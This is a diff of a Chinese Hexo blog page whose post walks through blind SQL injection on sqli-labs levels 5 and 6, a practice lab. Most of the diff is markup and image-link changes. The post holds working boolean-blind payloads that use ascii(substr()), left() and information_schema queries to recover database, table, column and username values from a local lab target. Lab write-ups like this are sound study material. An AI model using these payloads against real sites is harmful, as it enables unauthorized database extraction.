@@ -102,12 +102,12 @@ Yume Shoka = 月十三</title>
       </div>
       <div id="imgs" class="pjax">
         <ul>
-          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1giclg5ms2rj20zk0m8u0x.jpg"></li>
-          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1gipeu7txpzj20zk0m81kx.jpg"></li>
-          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1gipeybxm1pj20zk0m8niv.jpg"></li>
-          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1giclil3m4ej20zk0m8tn8.jpg"></li>
-          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1gipew28b65j20zk0m8hdt.jpg"></li>
-          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1giclip4jbpj20zk0m87cv.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giclfw2t96j20zk0m8x6p.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gipex2cdtbj20zk0m8x6p.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gipeudstjqj20zk0m8k3r.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gipevarprfj20zk0m8npd.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gipeyhsblkj20zk0m81kx.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giclhfehz7j20zk0m8u0x.jpg"></li>
         </ul>
       </div>
     </header>
@@ -156,65 +156,65 @@ Yume Shoka = 月十三</title>
     <hr>
 <p><em><strong>第五关：</strong></em></p>
 <p>本关和前四关不同，结果查询存在的话，不会像之前显示具体的账号密码，而是显示You are in………：</p>
-<p><img src="/images/image-20210930194920472.png" alt="image-20210930194920472"></p>
+<p><img data-src="/images/image-20210930194920472.png" alt="image-20210930194920472"></p>
 <p>如果sql查询不存在的话，就不会显示You are in……..</p>
 <p>这样的话，我们就不能根据最先爆出的数据库名来进行爆破，因为我们不知道它的数据库名。这种类型的SQL注入属于盲注型，要我们对每个名一个一个字符盲推。</p>
 <p>我们输入id=1’观察报错信息：</p>
-<p><img src="/images/image-20210930202915353.png" alt="image-20210930202915353"></p>
+<p><img data-src="/images/image-20210930202915353.png" alt="image-20210930202915353"></p>
 <p>那这里说明后台代码可能就是这样写的：select * from users where id=’$id’ limit 0,1</p>
 <p>我们注释掉后面的语句，有回显，说明这里是基于单引号的盲注。其实我们注释掉的可以是类似 and ‘1’=’1这样的语句：</p>
-<p><img src="/images/image-20210930203423659.png" alt="image-20210930203423659"></p>
+<p><img data-src="/images/image-20210930203423659.png" alt="image-20210930203423659"></p>
 <p>下面，就开始正题，我们要进行手工盲注测试：</p>
 <p>这里补充一些sql数据库函数：</p>
 <p>ascii(a)将a转换成其ASCII值<br>ord(a)将a转换成其ASCII值<br>left(a,b)从左往右截取字符串a的前b个字符<br>substr(a,b,c)从b位置开始，截取字符串a的c长度<br>mid(a,b,c)从位置b开始，截取a字符串的c位</p>
 <p>首先我们要知道数据库名，因为我们不能直接得到它的名，我们要一个一个把它的名的字符猜出来。那在这之前我们首先要知道它数据库名的长度：</p>
 <p>?id=1’ and (length(database())=1–+</p>
-<p><img src="/images/image-20210930204723266.png" alt="image-20210930204723266"></p>
-<p><img src="/images/image-20210930204841094.png" alt="image-20210930204841094"></p>
+<p><img data-src="/images/image-20210930204723266.png" alt="image-20210930204723266"></p>
+<p><img data-src="/images/image-20210930204841094.png" alt="image-20210930204841094"></p>
 <p>我们手工一个一个递增length的值，直到回显You are in……,此时的数值就是其数据库名的长度（8）</p>
 <p>然后我们要对数据库名的每个字符进行猜解:</p>
 <p>（这里不会跑脚本的话就尝试把ascii表里的每个字符试过去）</p>
 <p>?id=1’ and (left(database(),1)=’s’)–+</p>
 <p><strong>left(database(),1)=’s’</strong>表示数据库名从左往右取一个字符，判断该字符是否等于s<br><strong>left(database(),2)=’se’</strong>表示数据库名从左往右取两个个字符，判断该字符是否等于se</p>
 <p>~~</p>
-<p><img src="/images/image7.png" alt="img"></p>
+<p><img data-src="/images/image7.png" alt="img"></p>
 <p>我们可以打开命令行进行验证：</p>
-<p><img src="/images/image-20210930213840197.png"></p>
+<p><img data-src="/images/image-20210930213840197.png"></p>
 <p>接下来猜解security下的表名的个数：</p>
 <p>?id=1’ and (select count(table_name) from information_schema.tables where table_schema=’security’)=1–+</p>
 <p>将“=”右边的1进行递增就可判断数据库 security下的个数：</p>
-<p><img src="/images/image-20210930214849914.png" alt="image-20210930214849914"></p>
-<p><img src="/images/image-20210930214919725.png" alt="image-20210930214919725"></p>
+<p><img data-src="/images/image-20210930214849914.png" alt="image-20210930214849914"></p>
+<p><img data-src="/images/image-20210930214919725.png" alt="image-20210930214919725"></p>
 <p>然后判断每个表名的长度：ascii(substr((select table_name from information_schema.tables where table_schema=”security” limit 0,1),1,1))–+</p>
 <p>使用这个payload，如果页面返回“You are in……”,则表示第一张表的长度为1，同样，我们对<strong>limit num1,1),num2,1)<strong>的num进行递增，如果进行到</strong>limit 0,1),7,1))<strong>时页面返回空，则说明第一张表的长度为7-1=6（其中</strong>num1</strong>表示表的参数：0表示security下第一个表）</p>
-<p><img src="/images/image-20210930220419552.png" alt="image-20210930220419552"></p>
-<p><img src="/images/image-20210930220358739.png" alt="image-20210930220358739"></p>
+<p><img data-src="/images/image-20210930220419552.png" alt="image-20210930220419552"></p>
+<p><img data-src="/images/image-20210930220358739.png" alt="image-20210930220358739"></p>
 <p>然后我们就拿这个表进行破解，猜表名：</p>
 <p>ascii(substr((select table_name from information_schema.tables where table_schema=”security” limit 0,1),1,1))=1–+</p>
 <p>这里等号右边的1表示第一个字符对应ascii码的值，递增，直到”You are in”</p>
 <p>举俩个例子：</p>
-<p><img src="/images/image-20210930221701384.png" alt="image-20210930221701384"></p>
+<p><img data-src="/images/image-20210930221701384.png" alt="image-20210930221701384"></p>
 <p>打开cmd验证一下：</p>
-<p><img src="/images/image-20210930215225258.png" alt="image-20210930215225258"></p>
+<p><img data-src="/images/image-20210930215225258.png" alt="image-20210930215225258"></p>
 <p>第一个表名：emails,第一个字符ed ascii码为101</p>
-<p><img src="/images/image-20210930221905892.png" alt="image-20210930221905892"></p>
+<p><img data-src="/images/image-20210930221905892.png" alt="image-20210930221905892"></p>
 <p>第四个表users第一个字符u对应ascii码117</p>
 <p>接下来就要猜解每个表里的列的个数、列名以及列名长度，列名猜解，和上面原理都差不多，这里不再赘述，直接给出payload(以users表为例子)。</p>
-<p>猜解列的个数<br><a target="_blank" rel="noopener" href="http://127.0.0.1/sqlilabs/Less-5/?id=1&#39;">http://127.0.0.1/sqlilabs/Less-5/?id=1&#39;</a> and (select count(column_name) from information_schema.columns where table_name=’users’)=%d–+</p>
-<p>猜解列名长度<br><a target="_blank" rel="noopener" href="http://127.0.0.1/sqlilabs/Less-5/?id=1&#39;">http://127.0.0.1/sqlilabs/Less-5/?id=1&#39;</a> and ascii(substr((select column_name from information_schema.columns where table_name=”users” limit 0,1),1,1))–+</p>
-<p>猜解列名<br><a target="_blank" rel="noopener" href="http://127.0.0.1/sqlilabs/Less-5/?id=1&#39;">http://127.0.0.1/sqlilabs/Less-5/?id=1&#39;</a> and ascii(substr((select column_name from information_schema.columns where table_name=”users” limit 0,1),1,1))=97–+</p>
+<p>猜解列的个数<br><span class="exturl" data-url="aHR0cDovLzEyNy4wLjAuMS9zcWxpbGFicy9MZXNzLTUvP2lkPTEmIzM5Ow==">http://127.0.0.1/sqlilabs/Less-5/?id=1&#39;</span> and (select count(column_name) from information_schema.columns where table_name=’users’)=%d–+</p>
+<p>猜解列名长度<br><span class="exturl" data-url="aHR0cDovLzEyNy4wLjAuMS9zcWxpbGFicy9MZXNzLTUvP2lkPTEmIzM5Ow==">http://127.0.0.1/sqlilabs/Less-5/?id=1&#39;</span> and ascii(substr((select column_name from information_schema.columns where table_name=”users” limit 0,1),1,1))–+</p>
+<p>猜解列名<br><span class="exturl" data-url="aHR0cDovLzEyNy4wLjAuMS9zcWxpbGFicy9MZXNzLTUvP2lkPTEmIzM5Ow==">http://127.0.0.1/sqlilabs/Less-5/?id=1&#39;</span> and ascii(substr((select column_name from information_schema.columns where table_name=”users” limit 0,1),1,1))=97–+</p>
 <p>最后就是要猜解每个列里面的具体字段的长度以及值了(这里以猜解username为例)</p>
-<p>判断字段长度<br><a target="_blank" rel="noopener" href="http://127.0.0.1/sqlilabs/Less-5/?id=1&#39;">http://127.0.0.1/sqlilabs/Less-5/?id=1&#39;</a> and 1=(select count(username) from security.users)–+</p>
-<p>判断字段长度<br><a target="_blank" rel="noopener" href="http://127.0.0.1/sqlilabs/Less-5/?id=1&#39;">http://127.0.0.1/sqlilabs/Less-5/?id=1&#39;</a> and ascii(substr((select username from security.users limit 0,1),1,1))–+</p>
-<p>判断字段值<br><a target="_blank" rel="noopener" href="http://127.0.0.1/sqlilabs/Less-5/?id=1&#39;">http://127.0.0.1/sqlilabs/Less-5/?id=1&#39;</a> and ascii(substr((select username from security.users limit 0,1),1,1))=95–+</p>
-<p><img src="/images/image-20210930223229161.png" alt="image-20210930223229161"></p>
+<p>判断字段长度<br><span class="exturl" data-url="aHR0cDovLzEyNy4wLjAuMS9zcWxpbGFicy9MZXNzLTUvP2lkPTEmIzM5Ow==">http://127.0.0.1/sqlilabs/Less-5/?id=1&#39;</span> and 1=(select count(username) from security.users)–+</p>
+<p>判断字段长度<br><span class="exturl" data-url="aHR0cDovLzEyNy4wLjAuMS9zcWxpbGFicy9MZXNzLTUvP2lkPTEmIzM5Ow==">http://127.0.0.1/sqlilabs/Less-5/?id=1&#39;</span> and ascii(substr((select username from security.users limit 0,1),1,1))–+</p>
+<p>判断字段值<br><span class="exturl" data-url="aHR0cDovLzEyNy4wLjAuMS9zcWxpbGFicy9MZXNzLTUvP2lkPTEmIzM5Ow==">http://127.0.0.1/sqlilabs/Less-5/?id=1&#39;</span> and ascii(substr((select username from security.users limit 0,1),1,1))=95–+</p>
+<p><img data-src="/images/image-20210930223229161.png" alt="image-20210930223229161"></p>
 <hr>
 <p><em><strong>第六关：</strong></em></p>
 <p>本关以“闭合，其余和第五关一样，详细参考第五关:</p>
-<img src="/images/image-20210930225118492.png" style="zoom:67%;">
+<img data-src="/images/image-20210930225118492.png" style="zoom:67%;">
 
-<p><img src="/images/image-20210930225256860.png" alt="image-20210930225256860"></p>
-<p><img src="/images/image-20210930224952343.png"></p>
+<p><img data-src="/images/image-20210930225256860.png" alt="image-20210930225256860"></p>
+<p><img data-src="/images/image-20210930224952343.png"></p>
 
       <div class="tags">
           <a href="/tags/web%E5%AE%89%E5%85%A8/" rel="tag"><i class="ic i-tag"></i> -web安全</a>
@@ -284,7 +284,7 @@ Yume Shoka = 月十三</title>
     <div class="item left">
       
 
-  <a href="/2021/09/30/sql%20%E6%B3%A8%E5%85%A5%E7%AE%80%E4%BB%8B/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;tva2.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1gicli9lfebj20zk0m84qp.jpg" title="sql 注入简介">
+  <a href="/2021/09/30/sql%20%E6%B3%A8%E5%85%A5%E7%AE%80%E4%BB%8B/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;tva1.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1gipexj2jgzj20zk0m8b09.jpg" title="sql 注入简介">
   <span class="type">Previous Post</span>
   <span class="category"><i class="ic i-flag"></i> </span>
   <h3>sql 注入简介</h3>
@@ -294,7 +294,7 @@ Yume Shoka = 月十三</title>
     <div class="item right">
       
 
-  <a href="/2021/10/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;tva2.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1gicliierfjj20zk0m8npd.jpg" title="攻防世界刷题笔记">
+  <a href="/2021/10/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;tva1.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1gipexj2jgzj20zk0m8b09.jpg" title="攻防世界刷题笔记">
   <span class="type">Next Post</span>
   <span class="category"><i class="ic i-flag"></i> -CTF</span>
   <h3>攻防世界刷题笔记</h3>
@@ -397,76 +397,10 @@ Yume Shoka = 月十三</title>
   <li class="item">
     
 <div class="breadcrumb">
-</div>
-
-    <span><a href="/2021/11/17/autohotkey/" title="autohotkey">autohotkey</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-<a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" title="In --渗透测试">--渗透测试</a>
-</div>
-
-    <span><a href="/2022/09/28/XSS-Challenges/" title="XSS Challenges(1-7)">XSS Challenges(1-7)</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-<a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" title="In --渗透测试">--渗透测试</a>
-</div>
-
-    <span><a href="/2023/01/14/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E8%BF%94%E5%9B%9E%E9%99%90%E5%88%B6%E9%97%AE%E9%A2%98/" title="报错注入返回限制问题">报错注入返回限制问题</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-</div>
-
-    <span><a href="/2021/09/28/hello-world/" title="Hello World">Hello World</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-</div>
-
-    <span><a href="/2021/09/30/sql%20%E6%B3%A8%E5%85%A5%E7%AE%80%E4%BB%8B/" title="sql 注入简介">sql 注入简介</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-</div>
-
-    <span><a href="/2022/07/04/win10%E7%AE%A1%E7%90%86%E5%91%98%E6%9D%83%E9%99%90%E9%97%AE%E9%A2%98/" title="win10管理员权限问题">win10管理员权限问题</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-<a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" title="In --渗透测试">--渗透测试</a>
-</div>
-
-    <span><a href="/2022/09/14/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%B8%97%E9%80%8F/" title="永恒之蓝渗透">永恒之蓝渗透</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
 <a href="/categories/CTF/" title="In -CTF">-CTF</a>
 </div>
 
-    <span><a href="/2021/11/21/LSB%E9%9A%90%E5%86%99/" title="LSB隐写">LSB隐写</a></span>
+    <span><a href="/2021/11/19/simplerar/" title="simplerar(信息隐写)">simplerar(信息隐写)</a></span>
   </li>
 
       
@@ -483,10 +417,77 @@ Yume Shoka = 月十三</title>
   <li class="item">
     
 <div class="breadcrumb">
+<a href="/categories/sqli-labs/" title="In --sqli-labs">--sqli-labs</a>
+</div>
+
+    <span><a href="/2022/10/28/sql%E7%9B%B2%E6%B3%A8%E8%84%9A%E6%9C%AC/" title="sql盲注脚本">sql盲注脚本</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2021/09/28/hello-world/" title="Hello World">Hello World</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
 <a href="/categories/CTF/" title="In -CTF">-CTF</a>
 </div>
 
-    <span><a href="/2021/11/19/simplerar/" title="simplerar(信息隐写)">simplerar(信息隐写)</a></span>
+    <span><a href="/2021/10/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" title="攻防世界刷题笔记">攻防世界刷题笔记</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/mysql/" title="In -mysql">-mysql</a>
+</div>
+
+    <span><a href="/2022/07/04/python%E8%BF%9E%E6%8E%A5mysql%E5%9B%BE%E4%B9%A6%E7%AE%A1%E7%90%86/" title="python连接mysql图书管理">python连接mysql图书管理</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" title="In --渗透测试">--渗透测试</a>
+</div>
+
+    <span><a href="/2022/09/14/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%B8%97%E9%80%8F/" title="永恒之蓝渗透">永恒之蓝渗透</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2021/11/17/autohotkey/" title="autohotkey">autohotkey</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2021/09/30/sql%20%E6%B3%A8%E5%85%A5%E7%AE%80%E4%BB%8B/" title="sql 注入简介">sql 注入简介</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/sqli-labs/" title="In -sqli-labs">-sqli-labs</a>
+</div>
+
+    <span><a href="/2021/09/29/Less-1-4/" title="Less 1~4">Less 1~4</a></span>
   </li>
 
   </ul>
